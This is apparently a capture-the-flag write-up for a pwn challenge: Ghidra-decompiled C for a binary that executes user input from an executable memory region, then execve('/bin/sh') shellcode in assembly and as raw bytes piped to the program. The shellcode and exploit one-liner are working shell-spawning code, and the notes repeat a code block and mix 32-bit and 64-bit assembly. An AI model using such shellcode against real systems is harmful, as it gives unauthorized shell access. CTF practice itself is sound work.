# message

`nc ctf.tcp1p.com 8008`

```sh
file chall
# chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, 
# interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e1162c30beb8e3402633c04668f15039a1de7f63, 
# for GNU/Linux 3.2.0, not stripped


# 'no' -> segfault
# 'a'  -> illegal hardware instruction

```

opened in ghidra


```c
undefined8 main(void)

{
  void *__buf;
  code *__dest;
  undefined8 uVar1;
  
  __buf = malloc(0x150);
  __dest = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);

// void * mmap (void *address, size_t length, int protect, int flags, int filedes, off_t offset)
//
//   0x0 -> start address, allow system to find a suitable spot
//   0x1000 -> size of memory (4Kb)
//   7 -> PROT_READ | PROT_WRITE | PROT_EXECUTE
//   0x22 -> MAP_PRIVATE | MAP_ANONYMOUS
//   -1 -> file descriptor, anonymous memory, so no file
//   offset 0

  setup();
  seccomp_setup();

  if ((__dest == (code *)0xffffffffffffffff) || (__buf == (void *)0x0)) {
    perror("Allocation failed");
    uVar1 = 1;
  }
  else {
    puts("Anything you want to tell me? ");
    read(0,__buf,0x150); // 336 bytes
    memcpy(__dest,__buf,0x1000); // copy 4096 bytes from buffer
    (*__dest)(); // executes function -> shellcode? pop /bin/sh
    free(__buf);
    munmap(__dest,0x1000);
    uVar1 = 0;
  }
  return uVar1;
}
```



undefined8 main(void)

{
  void *__buf;
  code *__dest;
  undefined8 uVar1;
  
  __buf = malloc(0x150);
  __dest = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  setup();
  seccomp_setup();
  if ((__dest == (code *)0xffffffffffffffff) || (__buf == (void *)0x0)) {
    perror("Allocation failed");
    uVar1 = 1;
  }
  else {
    puts("Anything you want to tell me? ");
    read(0,__buf,0x150);
    memcpy(__dest,__buf,0x1000);
    (*__dest)();
    free(__buf);
    munmap(__dest,0x1000);
    uVar1 = 0;
  }
  return uVar1;
}


xor     eax, eax             ; Set EAX to 0
xor     edi, edi             ; Clear EDI
push    edi                  ; Null-terminate string
push    0x68732f2f          ; Push "hs//"
push    0x6e69622f          ; Push "nib/"
mov     ebx, esp             ; EBX points to "/bin/sh"
push    eax                  ; Push null byte
mov     edx, esp             ; EDX points to null byte
push    ebx                  ; Push the address of "/bin/sh" (EBX)
mov     ecx, esp             ; ECX points to "/bin/sh" (address)
mov     al, 11               ; syscall number for execve (11)
syscall                      ; Call the kernel




(python3 -c "import sys; sys.stdout.buffer.write(b'H\xb8/bin/sh\x00PH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H\xc7\xc2\x00\x00\x00\x00H\xc7\xc0;\x00\x00\x00\x0f\x05')") | ./chall
